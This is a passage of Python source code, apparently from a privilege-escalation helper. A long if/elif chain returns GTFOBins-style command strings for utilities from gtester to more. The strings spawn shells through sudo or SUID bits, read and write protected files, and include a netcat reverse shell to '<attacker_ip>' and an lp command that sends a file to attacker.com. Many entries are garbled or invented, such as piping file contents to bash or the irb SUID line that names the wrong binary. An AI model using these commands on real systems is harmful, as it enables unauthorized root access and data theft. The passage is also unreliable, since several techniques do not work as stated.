        elif gtfo_options == "file-write":
            bins.append("grep ""pattern"" file.txt > output.txt")

    elif gtfo_command == "gtester":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\ngtester ""DATA"" -o $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gtester) .\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF")
        elif gtfo_options == "sudo":
            bins.append(r"sudo TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngtester ""DATA"" -o $LFILE")

    elif gtfo_command == "gzip":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngzip -f $LFILE -t")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which gzip) .\nLFILE=file_to_read\n./gzip -f $LFILE -t")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\ngzip -f $LFILE -t")
        elif gtfo_options == "shell":
            bins.append(r"echo -n ""bash"" | gzip > bash_one_liner.gz\ngzip -dc bash_one_liner.gz | bash")
        elif gtfo_options == "file-write":
            bins.append("gzip -c myfile.txt > myfile.txt.gz")

    elif gtfo_command == "hd":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nhd ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\nhd ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which hd) .\nLFILE=file_to_read\n./hd ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("hd input.txt > output.txt")
        elif gtfo_options == "shell":
            bins.append("bash -c ""hd somefile.bin; exec bash""")

    elif gtfo_command == "head":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nhead -c1G ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which head) .\nLFILE=file_to_read\n./head -c1G ""$LFILE""")      
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\nhead -c1G ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("head input.txt > output.txt")
        elif gtfo_options == "shell":
            bins.append("head input.txt | bash")

    elif gtfo_command == "hexdump":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nhexdump -C ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which hexdump) .\nLFILE=file_to_read\n./hexdump -C ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\nhexdump -C ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("hexdump input.txt > output.txt")
        elif gtfo_options == "shell":
            bins.append("hexdump input.txt | bash")

    elif gtfo_command == "highlight":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nhighlight --no-doc --failsafe ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which highlight) .\nLFILE=file_to_read\n./highlight --no-doc --failsafe ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\nhighlight --no-doc --failsafe ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("highlight -O <output-format> <input-file> > <output-file>")
        elif gtfo_options == "shell":
            bins.append("highlight -O html input.c > output.html; bash")

    elif gtfo_command == "hping3":
        if gtfo_options == "shell":
            bins.append(r"hping3\n/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which hping3) .\n./hping3\n/bin/sh -p")
        elif gtfo_options == "sudo":
            bins.append(r"sudo hping3\n/bin/sh")
        elif gtfo_options == "file-write":
            bins.append("hping3 -S -p 80 example.com > output.txt")
        elif gtfo_options == "file-read":
            bins.append("hping3 -d $(wc -c < file.txt) -S -p 80 --data ""$(cat file.txt)"" target_ip")

    elif gtfo_command == "iconv":
        if gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\necho ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which iconv) .\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_write\necho ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("iconv -f utf-8 -t utf-8 <<< ""$(bash)""")

    elif gtfo_command == "iftop":
        if gtfo_options == "shell":
            bins.append(r"iftop\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo iftop\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which iftop) .\n./iftop\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("iftop -t -s 1 -L 10 -i /path/to/file")
        elif gtfo_options == "file-write":
            bins.append("iftop -t -s 10 -L 20 > /path/to/output_file.txt")

    elif gtfo_command == "install":
        if gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which install) .\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF")
        elif gtfo_options == "shell":
            bins.append("install -o root -g root -m 4755 /bin/bash /tmp/bash")
        elif gtfo_options == "file-read":
            bins.append("install -m 644 /path/to/restricted_file /tmp/copied_file")
        elif gtfo_options == "file-write":
            bins.append("install -m 644 /path/to/source_file /path/to/target_file")

    elif gtfo_command == "ionice":
        if gtfo_options == "shell":
            bins.append("ionice /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ionice) .\n./ionice /bin/sh -p")
        elif gtfo_options == "sudo":
            bins.append("sudo ionice /bin/sh")
        elif gtfo_options == "file-write":
            bins.append("ionice -c2 -n7 echo ""DATA"" > /path/to/target_file")
        elif gtfo_options == "file-read":
            bins.append("ionice -c2 -n7 cat /path/to/target_file")

    elif gtfo_command == "ip":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nip -force -batch ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ip) .\nLFILE=file_to_read\n./ip -force -batch ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo ip -force -batch ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("ip link show | tee /path/to/link_status.log")
        elif gtfo_options == "shell":
            bins.append("ip addr show | nc <attacker_ip> 4444 -e /bin/bash")

    elif gtfo_command == "irb":
        if gtfo_options == "shell":
            bins.append(r"irb\nexec '/bin/bash'")
        elif gtfo_options == "file-write":
            bins.append(r"irb\nFile.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }")
        elif gtfo_options == "file-read":
            bins.append(r"irb\nputs File.read(""file_to_read"")")
        elif gtfo_options == "sudo":
            bins.append(r"sudo irb\nexec '/bin/bash'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ip) .\n./irb\nexec '/bin/bash'")

    elif gtfo_command == "ispell":
        if gtfo_options == "shell":
            bins.append(r"ispell /etc/passwd\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ispell) .\n./ispell /etc/passwd\n!/bin/sh -p")
        elif gtfo_options == "sudo":
            bins.append(r"sudo ispell /etc/passwd\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("ispell /path/to/file.txt")
        elif gtfo_options == "file-write":
            bins.append("ispell -b /path/to/input_file.txt > /path/to/output_file.txt")

    elif gtfo_command == "jjs":
        if gtfo_options == "shell":
            bins.append(r"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs")
        elif gtfo_options == "file-write":
            bins.append(r"echo 'var FileWriter = Java.type(""java.io.FileWriter"");\nvar fw=new FileWriter(""./file_to_write"");\nfw.write(""DATA"");\nfw.close();' | jjs")
        elif gtfo_options == "file-read":
            bins.append(r"echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");\nvar FileReader = Java.type(""java.io.FileReader"");\nvar br = new BufferedReader(new FileReader(""file_to_read""));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which jjs) .\necho ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs")
        elif gtfo_options == "sudo":
            bins.append(r"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs")

    elif gtfo_command == "joe":
        if gtfo_options == "shell":
            bins.append(r"joe\n^K!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo joe\n^K!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which joe) .\n./joe\n^K!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("joe filename.txt")
        elif gtfo_options == "file-write":
            bins.append("joe FILE_TO_WRITE")

    elif gtfo_command == "join":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\njoin -a 2 /dev/null $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which join) .\nLFILE=file_to_read\n./join -a 2 /dev/null $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\njoin -a 2 /dev/null $LFILE")
        elif gtfo_options == "shell":
            bins.append("join file1.txt file2.txt && bash")

    elif gtfo_command == "journalctl":
        if gtfo_options == "shell":
            bins.append(r"journalctl\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo journalctl\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("journalctl --since ""DATE 12:00:00"" --until ""DATE 12:00:00""")
        elif gtfo_options == "file-write":
            bins.append("journalctl > output.log")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which journalctl) .\n./journalctl\n/bin/sh")

    elif gtfo_command == "jq":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\njq -Rr . ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which jq) .\nLFILE=file_to_read\n./jq -Rr . ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo jq -Rr . ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("jq -n 'system(""bash"")'")
        elif gtfo_options == "file-write":
            bins.append("jq . filename.json > output.txt")

    elif gtfo_command == "jrunscript":
        if gtfo_options == "shell":
            bins.append(r"jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""")
        elif gtfo_options == "file-write":
            bins.append("jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'")
        elif gtfo_options == "file-read":
            bins.append("jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which jrunscript) .\n./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""")
        elif gtfo_options == "sudo":
            bins.append(r"sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""")

    elif gtfo_command == "jtag":
        if gtfo_options == "shell":
            bins.append(r"jtag --interactive\nshell /bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo jtag --interactive\nshell /bin/sh")
        elif gtfo_options == "file-read":
            bins.append("openocd -f interface/ftdi/my-jtag-interface.cfg -f target/stm32f4x.cfg")
        elif gtfo_options == "file-write":
            bins.append("> load_image /path/to/your/file.bin 0x20000000 bin")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which jtag) .\n./jtag --interactive\nshell /bin/sh")

    elif gtfo_command == "julia":
        if gtfo_options == "shell":
            bins.append("julia -e 'run(`/bin/sh`)'")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\njulia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which julia) .\n./julia -e 'run(`/bin/sh -p`)'")
        elif gtfo_options == "sudo":
            bins.append("sudo julia -e 'run(`/bin/sh`)'")

    elif gtfo_command == "knife":
        if gtfo_options == "shell":
            bins.append("knife exec -E 'exec ""/bin/sh""'")
        elif gtfo_options == "sudo":
            bins.append("sudo knife exec -E 'exec ""/bin/sh""'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which knife) .\n./knife exec -E 'exec ""/bin/sh""'")
        elif gtfo_options == "file-read":
            bins.append("knife cookbook show COOKBOOK_NAME FILE_PATH")
        elif gtfo_options == "file-write":
            bins.append("knife cookbook upload COOKBOOK_NAME")

    elif gtfo_command == "ksh":
        if gtfo_options == "shell":
            bins.append("ksh")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\nksh -c 'echo ""$(<$LFILE)""'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ksh) .\n./ksh -p")
        elif gtfo_options == "sudo":
            bins.append("sudo ksh")

    elif gtfo_command == "ksshell":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nksshell -i $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo ksshell -i $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ksshell) .\nLFILE=file_to_read\n./ksshell -i $LFILE")
        elif gtfo_options == "shell":
            bins.append("%post --interpreter=/bin/bash -e; ksshell; end")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ksshell) .\n%post --interpreter=/bin/bash -e; ./ksshell; end")

    elif gtfo_command == "ksu":
        if gtfo_options == "sudo":
            bins.append("sudo ksu -q -e /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ksu) .\n./ksu -q -e /bin/sh")
        elif gtfo_options == "shell":
            bins.append("ksu -l")
        elif gtfo_options == "file-read":
            bins.append("ksu -c ""ls /file_path""")
        elif gtfo_options == "file-write":
            bins.append("ksu -c 'echo ""DATA"" > /path/to/protected_file.txt'")

    elif gtfo_command == "kubectl":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which kubectl) .\nLFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/")
        elif gtfo_options == "file-read":
            bins.append("kubectl get configmap <configmap-name> -o yaml")
        elif gtfo_options == "file-write":
            bins.append("kubectl exec -it <pod-name> -- bash -c 'echo ""DATA"" > /path/to/your/file.txt'")
        elif gtfo_options == "shell":
            bins.append("kubectl exec -it <pod-name> -- /bin/bash")

    elif gtfo_command == "latex":
        if gtfo_options == "shell":
            bins.append(r" latex --shell-escape '\documentclass(article)\ begin)document)\immediate\write18{/bin/sh}\end{document}'")
        elif gtfo_options == "file-read":
            bins.append(r"latex '\documentclass (article) \ usepackage (verbatim) \ begin (document)\ verbatiminput (file_to_read)\end (document)'\nstrings article.dvi")
        elif gtfo_options == "sudo":
            bins.append(r"sudo latex --shell-escape '\documentclass(article)\ begin(document)\immediate\write18{/bin/sh}\end{document}'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which latex) .\n./latex --shell-escape '\documentclass(article)\ begin(document)\immediate\write18{/bin/sh}\end{document}'")
        elif gtfo_options == "file-write":
            bins.append(r"latex '\documentclass (article) \ usepackage (verbatim)\ begin (document)\ verbatiminput (file_to_write)\end (document)'\nstrings article.dvi")

    elif gtfo_command == "latexmk":
        if gtfo_options == "shell":
            bins.append("latexmk -e 'exec ""/bin/sh"";'")
        elif gtfo_options == "sudo":
            bins.append("sudo latexmk -e 'exec ""/bin/sh"";'")
        elif gtfo_options == "file-read":
            bins.append("latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which latexmk) .\n./latexmk -e 'exec ""/bin/sh"";'")
        elif gtfo_options == "file-write":
            bins.append(r"echo ""DATA"" > X\nlatexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'")

    elif gtfo_command == "less":
        if gtfo_options == "shell":
            bins.append(r"less /etc/profile\n!/bin/sh")
        elif gtfo_options == "file-write":
            bins.append(r"echo DATA | less\nsfile_to_write\nq")
        elif gtfo_options == "file-read":
            bins.append("less file_to_read")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which less) .\n./less file_to_read")
        elif gtfo_options == "sudo":
            bins.append(r"sudo less /etc/profile\n!/bin/sh")

    elif gtfo_command == "ld.so":
        if gtfo_options == "shell":
            bins.append("/lib/ld.so /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ld.so) .\n./ld.so /bin/sh -p")
        elif gtfo_options == "sudo":
            bins.append("sudo /lib/ld.so /bin/sh")
        elif gtfo_options == "file-read":
            bins.append("/lib/ld.so --audit <LIST>")
        elif gtfo_options == "file-write":
            bins.append("/lib/ld.so --preload <SCRIPT>")

    elif gtfo_command == "ldconfig":
        if gtfo_options == "shell":
            bins.append(r"echo '#include <unistd.h>\n__attribute__((constructor))\nstatic void init() {\nexecl(""/bin/sh"", ""/bin/sh"", ""-p"", NULL);\n}\n' >""$TF/lib.c""")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\necho ""$TF"" > ""$TF/conf""\n# move malicious libraries in $TF\nsudo ldconfig -f ""$TF/conf""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ldconfig) . TF=$(mktemp -d)\necho ""$TF"" > ""$TF/conf""\n# move malicious libraries in $TF\nsudo ./ldconfig -f ""$TF/conf""")
        elif gtfo_options == "file-read":
            bins.append("echo ""/usr/local/lib"" | sudo tee /etc/ld.so.conf.d/my_custom_libs.conf")
        elif gtfo_options == "file-write":
            bins.append("echo ""/usr/local/lib"" | sudo tee /etc/ld.so.conf.d/my_custom_libs.conf && sudo ldconfig > ldconfig.log 2>&1")

    elif gtfo_command == "lftp":
        if gtfo_options == "shell":
            bins.append("lftp -c '!/bin/sh'")
        elif gtfo_options == "sudo":
            bins.append("sudo lftp -c '!/bin/sh'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which lftp) .\n./lftp -c '!/bin/sh'")
        elif gtfo_options == "file-read":
            bins.append("lftp -u username,password ftp://ftp.example.com -e ""get remotefile.txt; bye""")
        elif gtfo_options == "file-write":
            bins.append("lftp -u username,password ftp://ftp.example.com -e ""put localfile.txt; bye""")

    elif gtfo_command == "links":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nlinks ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo links ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which links) .\nLFILE=file_to_read\n./links ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"echo ""DATA"" > file_to_write\nLFILE=file_to_write\nlinks ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("(links &); bash")

    elif gtfo_command == "ln":
        if gtfo_options == "shell":
            bins.append("ln -fs /bin/sh /bin/ln")
        elif gtfo_options == "sudo":
            bins.append("sudo ln")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ln) .\n./ln -fs /bin/sh /bin/ln")
        elif gtfo_options == "file-write":
            bins.append("ln -s originalfile.txt linkfile.txt")
        elif gtfo_options == "file-read":
            bins.append(r"ln -s file_to_link file_to_read\ncat file_to_read")

    elif gtfo_command == "loginctl":
        if gtfo_options == "shell":
            bins.append(r"loginctl user-status\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo loginctl user-status\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which loginctl) .\n./loginctl user-status\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"loginctl list-sessions -j file\n cat file")
        elif gtfo_options == "file-write":
            bins.append("loginctl list-sessions -j file_to_write")

    elif gtfo_command == "logsave":
        if gtfo_options == "shell":
            bins.append("logsave /dev/null /bin/sh -i")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which logsave) .\n./logsave /dev/null /bin/sh -i -p")
        elif gtfo_options == "sudo":
            bins.append("sudo logsave /dev/null /bin/sh -i")
        elif gtfo_options == "file-read":
            bins.append("logsave logfile.txt cat filename.txt")
        elif gtfo_options == "file-write":
            bins.append("logsave -a output.log ls -l")

    elif gtfo_command == "look":
        if gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which look) .\nLFILE=file_to_read\n./look '' ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nlook '' ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo look '' ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("look prefix file.txt > output.txt")
        elif gtfo_options == "shell":
            bins.append("look /bin/sh")

    elif gtfo_command == "ltrace":
        if gtfo_options == "shell":
            bins.append("ltrace -b -L /bin/sh")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nltrace -F $LFILE /dev/null")
        elif gtfo_options == "sudo":
            bins.append("sudo ltrace -b -L /bin/bash")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ltrace) .\n./ltrace -b -L /bin/bash")

    elif gtfo_command == "lp":
        if gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST")
        elif gtfo_options == "file-read":
            bins.append("please run file-write")
        elif gtfo_options == "shell":
            bins.append("please run file-write")
        elif gtfo_options == "sudo":
            bins.append("please run file-write")
        elif gtfo_options == "suid":
            bins.append("please run file-write")

    elif gtfo_command == "lua":
        if gtfo_options == "shell":
            bins.append("lua -e 'os.execute(""/bin/sh"")'")
        elif gtfo_options == "file-write":
            bins.append("lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'")
        elif gtfo_options == "file-read":
            bins.append("lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which lua) .\nlua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'")
        elif gtfo_options == "sudo":
            bins.append("sudo lua -e 'os.execute(""/bin/sh"")'")

    elif gtfo_command == "lualatex":
        if gtfo_options == "shell":
            bins.append(r"lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
        elif gtfo_options == "sudo":
            bins.append(r"sudo lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which lualatex) .\n./lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
        elif gtfo_options == "file-read":
            bins.append("lualatex script.tex")
        elif gtfo_options == "file-write":
            bins.append(r"echo 'SCRIPT' > script.tex\n lualatex script.tex")

    elif gtfo_command == "luatex":
        if gtfo_options == "shell":
            bins.append(r"luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
        elif gtfo_options == "sudo":
            bins.append(r"sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which luatex) .\n./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
        elif gtfo_options == "file-read":
            bins.append("luatex file.tex")
        elif gtfo_options == "file-write":
            bins.append(r"echo 'DATA' > file.tex\nluatex file.tex")
        
    elif gtfo_command == "lwp-download":
        if gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file: //$TF $LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nTF=$(mktemp)\nlwp-download ""file://$LFILE"" $TF\ncat $TF")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which lwp-download) .\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./lwp-download file: //$TF $LFILE")
        elif gtfo_options == "shell":
            bins.append("lwp-download && bash")

    elif gtfo_command == "lwp-request":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nlwp-request ""file://$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo lwp-request ""file://$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"echo ""DATA"" > LFILE\nlwp-request ""file://$LFILE""")
        elif gtfo_options == "shell":
            bins.append("lwp-request ""file://$LFILE"" | bash")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which lwp-request) .\nLFILE=file_to_read\n./lwp-request ""file://$LFILE""")

    elif gtfo_command == "mail":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho ""From nobody@localhost $(date)"" > $TF\nmail -f $TF\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo mail --exec='!/bin/sh'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which mail) .\nTF=$(mktemp)\necho ""From nobody@localhost $(date)"" > $TF\n./mail -f $TF\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"mail -s 'DATA' nobody@localhost < filename.txt\ncat filename.txt")
        elif gtfo_options == "file-write":
            bins.append("mail -s 'DATA' nobody@localhost < filename.txt")

    elif gtfo_command == "make":
        if gtfo_options == "shell":
            bins.append(r"COMMAND='/bin/sh'\nmake -s --eval=$'x:\n\t-'""$COMMAND""")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nmake -s --eval=""\$(file >$LFILE,DATA)"" .")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which make) .\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\n\t-'""$COMMAND""")
        elif gtfo_options == "sudo":
            bins.append(r"COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\n\t-'""$COMMAND""")
        elif gtfo_options == "file-read":
            bins.append(r"echo 'DATA' makefile\nmake makefile")

    elif gtfo_command == "man":
        if gtfo_options == "shell":
            bins.append(r"man man\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("man file_to_read")
        elif gtfo_options == "sudo":
            bins.append(r"sudo man man\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which man) .\n./man man\n!/bin/sh")
        elif gtfo_options == "file-write":
            bins.append("No GTFO bin available")

    elif gtfo_command == "mawk":
        if gtfo_options == "shell":
            bins.append("mawk 'BEGIN {system(""/bin/sh"")}'")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmawk '//' ""$LFILE""") 
        elif gtfo_options == "sudo":
            bins.append("sudo mawk 'BEGIN {system(""/bin/sh"")}'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which mawk) .\nLFILE=file_to_read\n./mawk '//' ""$LFILE""")

    elif gtfo_command == "minicom":
        if gtfo_options == "shell":
            bins.append("minicom -D /dev/null")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which minicom) .\n./minicom -D /dev/null")
        elif gtfo_options == "sudo":
            bins.append("sudo minicom -D /dev/null")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "file-read":
            bins.append("N/A")    

    elif gtfo_command == "more":
        if gtfo_options == "shell":
            bins.append(r"TERM= more /etc/profile\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("more file_to_read")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "suid":
